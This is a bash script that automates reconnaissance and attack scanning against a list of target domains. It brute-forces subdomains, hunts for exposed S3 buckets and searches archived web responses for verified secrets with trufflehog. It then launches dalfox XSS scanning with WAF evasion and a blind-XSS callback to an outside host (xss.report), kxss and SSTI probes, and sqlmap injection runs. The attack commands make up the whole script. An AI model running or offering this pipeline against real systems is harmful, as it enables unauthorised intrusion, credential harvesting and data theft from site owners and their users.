#!/bin/bash

subfinder -dL domains.txt -all -t 200 -o subdomains.txt;
cat subdomains.txt | dnsgen - | head -n 10000000 > gen.txt;
puredns resolve gen.txt -r ~/resolvers.txt | anew subdomains.txt;

while true; do
    output=$(cat subdomains.txt | dnsgen - | anew gen.txt);
    if [ -z "$output" ]; then
        echo "[😔] no new outputs generated";
        echo "breaking!"
        break
    else
        second_output=$(echo $output | tr ' ' '\n' | puredns resolve -r ~/resolvers.txt | anew subdomains.txt);
        if [ -z "$second_output" ]; then
            echo "[😔] Nothing  new to resolve";
            echo "breaking!"
            break
        fi
    fi
done


puredns bruteforce ~/33m-subdomain-wordlist.txt -d domains.txt -r ~/resolvers.txt | anew subdomains.txt;

for i in {2..10}; do
    output=$(cat subdomains.txt | dsieve -f $i)
    echo "[+] bruteforcing level $i";
    echo $output | xargs -n1 echo;
    if [ -z "$output" ]; then
        break
    fi
    if [[ $i -gt 3 ]]; then
        echo "[+] bruteforcing started on level 4+";
        echo $output | xargs -n1 echo > level-$i-subs.txt;
        puredns bruteforce ~/levels4plus.txt -r ~/resolvers.txt -d level-$i-subs.txt | anew subdomains.txt;
    else
        file=$(($i-1));
        echo $output | xargs -n1 echo > level-$i-subs.txt;
        puredns bruteforce ~/level$file.txt -r ~/resolvers.txt -d level-$i-subs.txt | anew subdomains.txt;
    fi
done


rm gen.txt;


python ~/S3Scanner/s3scanner.py -l domains.resolved -o buckets.txt




# live url scanning
httpx -l subdomains.txt -mc 200 -t 200 | tee urls.txt;

katana -list naabu -jc -jsl -d 5 -headless -no-sandbox -ef css,jpg,png,svg,pdf,woff,ttf,jpeg -kf all -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -o urls3.txt


# --- waymore ---

mkdir waymore;
python3 ~/waymore/waymore.py -i domains.txt -mode B -oU waymore/urls1.txt -oR waymore/responses -l 0 -lcc 0;

trufflehog filesystem ./waymore/responses --only-verified | notify -bulk;
wayfils -f waymore/responses -s > wayfiles.txt;

python3 ~/xnLinkFinder/xnLinkFinder.py -i waymore/responses/ -o waymore/urls2.txt -op parameter_list.txt -owl wordlist.txt -sp domains.txt -sf domains.txt -t 5 -s429 -s403 -sTO -sCE -mfs 60000 -mtl 720;

sort -u parameter_list.txt wordlist.txt > garbage_params.txt
duplicut garbage_params.txt -o params.txt;
rm parameter_list.txt wordlist.txt garbage_params.txt;

sort -u waymore/urls* | httpx -mc 200 -t 200 > historic_urls.txt;

cat historic_urls.txt | grep = | uro > historic_urls_query_params.txt;

cat historic_urls_query_params.txt | kxss | grep '[><"]' | anew kxss-results.tx | notify -bulk -silent;

cat historic_urls_query_params.txt | kssti | grep "4584996 found in the response!" -B 4 | anew kssti-results.txt | notify -bulk -silent;

cat params.txt | dalfox pipe -b "https://xss.report/c/pr0xy" --deep-domxss --found-action='notify -silent' --output dalfox.txt --silence --skip-bav --skip-mining-all --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" --waf-evasion

python3 ~/sqlmap-dev/sqlmap.py -m params.txt --alert='notify -silent' --level=3 --timeout=5 --retries=2 --keep-alive --threads=10 --smart --batch --banner --results-file=sqlmap.csv